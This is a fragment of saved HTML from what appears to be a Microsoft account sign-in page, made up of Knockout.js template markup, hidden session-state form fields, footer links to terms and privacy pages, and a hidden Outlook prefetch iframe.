            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <input type="hidden" name="canary" data-bind="value: svr.canary" value="MX3UyYe6X3TnGR1IfdbyUzdoTHldJMxv0RWLD1UJKwk=9:1">
        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAjZI9bNNQAIT94tT94a-ChW5VYQHxEjvPjuNISJS0Sho7JG7jJs5SOfZz4sbOSxw7aTKwoEqMFSMbLEjtBFOphGBD7UIRGxNiqlCREFMlFhqxMPbT6XTz3d2luRiXvs3-IwHHDlnb5qCJx-k__Oszs9XPczs39l49ieiRw9P38ttdsNAMgk4vHY-TMHAJacWIbTsmRkkhZhIvTgZGfB-AYwBOANiNiEmUYs_FJnkJpXghhVAMmywv2ZYNWVxnIS9iHkqCxUM-wSHBEhICMpJfI9eKi2HQTIyN-M4I_45M28T3NjqkFzyn98GSHkoZUhhkFx9uwqFoaZuwrIyWa53lYrOYbeRkcY0XNEmVm_r6mgRho96vK052OScXc8biylY-b5mqqraMrqDKBbE0UHNd1De1RqMiYy3TbWpYVoqlTGZo8C3NTQ1RGXr9tWHd05XVas1oNGGFV2oJpTWqNTKBX7ERK7obj4yOi7stt4RsFYdizZN4U1f0klXyUjbm1jd26QuV_4Zmzuv0SPuIZkgHtx3rO33Hdeo-sbCPTdfwDNMhbdzrO34QGu6DsG30DC-GrTDWwcdR8C0KfkQvs3R6ampmlrpJzVNnUfBy4nzTyXnM3nt8K783t_3s4yeOOpqIF6pIG-o4WUXldnaVW7Gt-lAbWaScc618YavPrlaUJU7Ly4PWfZTmdhiwwzAHzPQUPUst0JkSd8KAX0zk6SR1MH2BgxxfAh-uUGdX3704_PJn-_XP3F81">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="62ac6258-2a5d-49ed-88be-bbf792a6bf01">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAD--DLA3VO7QrddgJg7WevrCPYmzSON5cAYVXlbLJolehxsPFON-WWefqNtrcNdleRBJyMiqPzdBwBb1XYjo4eFvGSkhKKaaplfeRxDAiYAnU1aA1DfKX-Zja9MjJHO5lAO1ZQnr48QgxWB6X3xW3ml3V4DrqLK3v5IZW1o6YmSB39yh9x5JzfTCo4ME3Jz5PMnDIZ21OILIp87H23L2ic_H214LKEGx2aDMlrVXAosh2mXtsDczklt_XkDWLfjBie3DGGDX_NOTVP4vn2_CGlXok0NVvlkurex2WuSc9DvIT4nnlIX34rwkA8QMkIWw65wRr8uWZoSrrwI3b0Yf04cGlKzVxaLox0uOQiaRzKySA8ez3drPOvAPT-o70MlEiSbFgPkoWUf1rm1tJ2b3auYPo4ZZPBGlubC33XmBOglCg3pMquACZPqs4wDipiz8iImEFoEHofa8kGSRhT9eqitQ8ej8K7Xe5CqaJiWssYRwOBm4ZpfEpS8KEG3mtHgBWe1hiQwyYADBRur9LSI-9uvx1bwEb--0LS54dA97DFuL1XSJKCfSuBRnvq5OMgj2pk7B0Hyqx0U2ItdHKGT5sqpFbGEJ3hLHPCnhINmeKuNK-Pegu-9FOYDFVElkxJFfBfU2zubR4uNJlz0j-ku9d3qIAA">
        <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
        <input type="hidden" name="isRecoveryAttemptPost" data-bind="value: isRecoveryAttemptPost() ? 1 : 0" value="0">
        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer has-background ext-has-background background-always-visible ext-background-always-visible">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background background-always-visible ext-background-always-visible">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background background-always-visible ext-background-always-visible">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item has-background ext-has-background background-always-visible ext-background-always-visible">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.urlCBPartnerPreload -->
<div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx" style="display: none;"></iframe></div>
<!-- /ko -->

<!-- ko if: svr.urlDeviceFingerprinting --><!-- /ko --></div></body></html>